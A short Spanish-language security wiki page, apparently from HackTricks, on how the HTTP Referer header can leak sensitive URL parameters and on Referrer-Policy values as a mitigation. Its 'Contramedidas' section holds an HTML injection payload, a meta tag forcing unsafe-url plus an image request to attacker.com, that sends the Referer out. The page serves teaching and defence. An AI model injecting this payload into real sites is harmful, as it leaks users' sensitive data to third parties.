{{#include ../banners/hacktricks-training.md}}

# Encabezados y políticas de referencia

Referrer es el encabezado utilizado por los navegadores para indicar cuál fue la página anterior visitada.

## Información sensible filtrada

Si en algún momento dentro de una página web se encuentra información sensible en los parámetros de una solicitud GET, si la página contiene enlaces a fuentes externas o un atacante puede hacer/sugerir (ingeniería social) que el usuario visite una URL controlada por el atacante. Podría ser capaz de exfiltrar la información sensible dentro de la última solicitud GET.

## Mitigación

Puedes hacer que el navegador siga una **Referrer-policy** que podría **evitar** que la información sensible sea enviada a otras aplicaciones web:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contramedidas

Puedes anular esta regla utilizando una etiqueta meta HTML (el atacante necesita explotar una inyección HTML):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Defensa

Nunca pongas datos sensibles dentro de los parámetros GET o rutas en la URL.

{{#include ../banners/hacktricks-training.md}}
